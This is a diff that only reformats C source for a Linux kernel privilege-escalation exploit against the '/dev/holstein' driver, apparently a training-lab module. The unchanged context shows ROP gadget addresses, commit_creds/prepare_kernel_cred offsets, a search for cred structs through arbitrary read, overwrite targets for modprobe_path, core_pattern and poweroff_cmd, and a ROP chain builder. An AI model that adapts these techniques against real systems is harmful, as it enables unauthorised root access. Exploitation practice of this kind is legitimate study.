@@ -14,8 +14,8 @@
             fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);                   \
         }                                                                      \
     }
-#define info_prefix "[*] "
-#define info(msg, ...) printf(info_prefix msg "\n", ##__VA_ARGS__);
+#define info_prefix        "[*] "
+#define info(msg, ...)     printf(info_prefix msg "\n", ##__VA_ARGS__);
 #define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
 #define fatal(msg, ...)                                                        \
     {                                                                          \
@@ -27,30 +27,30 @@
         printf(info_prefix "Press ENTER to continue");                         \
         getchar();                                                             \
     }
-#define var(var) printf(info_prefix #var " = 0x%016llx\n", var);
+#define var(var)     printf(info_prefix #var " = 0x%016llx\n", var);
 #define rebase(addr) (addr - RAW_KBASE + kbase)
 
 #define DEVICE_NAME "/dev/holstein"
-#define RAW_KBASE 0xffffffff81000000
+#define RAW_KBASE   0xffffffff81000000
 
 /* push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; */
 #define push_rdx_pop_rsp rebase(0xffffffff8114fbea)
-#define pop_rdi rebase(0xffffffff8114078a)
-#define mov_rax_prdx rebase(0xffffffff813aadf9)
-#define mov_prdx_ecx rebase(0xffffffff810109ed)
+#define pop_rdi          rebase(0xffffffff8114078a)
+#define mov_rax_prdx     rebase(0xffffffff813aadf9)
+#define mov_prdx_ecx     rebase(0xffffffff810109ed)
 
 #define prepare_kernel_cred rebase(0xffffffff81072560)
-#define commit_creds rebase(0xffffffff810723c0)
+#define commit_creds        rebase(0xffffffff810723c0)
 #define swapgs_restore_regs_and_return_to_usermode                             \
     rebase(0xffffffff81800e10 + 22)
-#define modprobe_path rebase(0xffffffff81e38480)
-#define core_pattern rebase(0xffffffff81eb12e0)
-#define poweroff_cmd rebase(0xffffffff81e37cc0)
+#define modprobe_path      rebase(0xffffffff81e38480)
+#define core_pattern       rebase(0xffffffff81eb12e0)
+#define poweroff_cmd       rebase(0xffffffff81e37cc0)
 #define poweroff_work_func rebase(0xffffffff81073240)
 
 typedef unsigned long long u64;
-typedef unsigned int u32;
-typedef unsigned char u8;
+typedef unsigned int       u32;
+typedef unsigned char      u8;
 
 u8 DEBUG_FLAG = 0;
 
@@ -125,10 +125,8 @@ void overwrite_cred_privesc() {
     for (cred_ptr = start_addr; cred_ptr >= start_addr; cred_ptr += 16) {
         if ((cred_ptr & 0xfffff) == 0)
             progress("Searching... @ 0x%016llx", cred_ptr);
-        if (aar32(cred_ptr + 0) != comm[0])
-            continue;
-        if (aar32(cred_ptr + 4) != comm[1])
-            continue;
+        if (aar32(cred_ptr + 0) != comm[0]) continue;
+        if (aar32(cred_ptr + 4) != comm[1]) continue;
         cred_ptr = cred_ptr - 0x8;
         break;
     }
@@ -219,7 +217,7 @@ void overwrite_poweroff_cmd_privesc() {
 
 void ropchain(int fd) {
     u64 *ptr = (u64 *)buf;
-    u64 i = 0;
+    u64  i = 0;
     ptr[i++] = pop_rdi;
     if (global_cstate == create_cred_struct_state) {
         ptr[i++] = 0;
